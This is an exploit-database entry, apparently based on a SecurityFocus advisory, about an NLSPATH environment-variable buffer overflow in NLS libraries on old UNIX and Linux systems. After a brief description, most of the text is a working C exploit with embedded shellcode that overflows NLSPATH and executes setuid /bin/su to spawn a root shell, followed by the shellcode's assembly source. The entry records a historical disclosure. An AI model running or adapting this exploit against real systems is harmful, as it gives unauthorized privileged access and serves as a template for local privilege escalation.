Cray UNICOS 9.0/9.2/MAX 1.3/mk 1.5,AIX <= 4.2,Linux libc <= 5.2.18,RedHat 4.0,IRIX 6.2,Slackware 3.1 Natural Language Service (NLS) Vulnerability (2)  
 
source: http://www.securityfocus.com/bid/711/info
 
A buffer overflow condition affects libraries using the Natural Language Service (NLS). The NLS is the component of UNIX systems that provides facilities for customizing the natural language formatting for the system. Examples of the types of characteristics that can be set are language, monetary symbols and delimiters, numeric delimiters, and time formats.
 
Some libraries that use a particular environment variable associated with the NLS contain a vulnerability in which a buffer overflow condition can be triggered. The particular environment variable involved is NLSPATH on some systems and PATH_LOCALE on others.
 
It is possible to exploit this vulnerability to attain unauthorized access by supplying carefully crafted arguments to programs that are owned by a privileged user-id and that have setuid or setgid bits set. 


--- nlspath.c ---

/*
 * NLSPATH buffer overflow exploit for Linux, tested on Slackware 3.1
 * Copyright (c) 1997 by Solar Designer
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shellcode =
  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
  "\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
  "\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
  "\xcd\x80/"
  "/bin/sh"
  "0";

char *get_sp() {
   asm("movl %esp,%eax");
}

#define bufsize 2048
char buffer[bufsize];

main() {
  int i;

  for (i = 0; i < bufsize - 4; i += 4)
    *(char **)&buffer[i] = get_sp() - 3072;

  memset(buffer, 0x90, 512);
  memcpy(&buffer[512], shellcode, strlen(shellcode));

  buffer[bufsize - 1] = 0;

  setenv("NLSPATH", buffer, 1);

  execl("/bin/su", "/bin/su", NULL);
}

--- nlspath.c ---

And the shellcode separately:

--- shellcode.s ---

.text
.globl shellcode
shellcode:
xorl %eax,%eax
movb $0x31,%al
int $0x80
xchgl %eax,%ebx
xorl %eax,%eax
movb $0x17,%al
int $0x80
.byte 0x68
popl %ecx
popl %eax
jmp *%ecx
call *%esp
xorl %eax,%eax
cltd
movl %ecx,%edi
movb $'/'-1,%al
incl %eax
scasb %es:(%edi),%al
jne -3
movl %edi,(%ecx)
movl %edx,4(%ecx)
movl %edi,%ebx
incl %eax
scasb %es:(%edi),%al
jne -3
movb %dl,-1(%edi)
movb $0x0B,%al
int $0x80
xorl %eax,%eax
incl %eax
xorl %ebx,%ebx
int $0x80
.byte '/'
.string "/bin/sh0"

--- shellcode.s ---







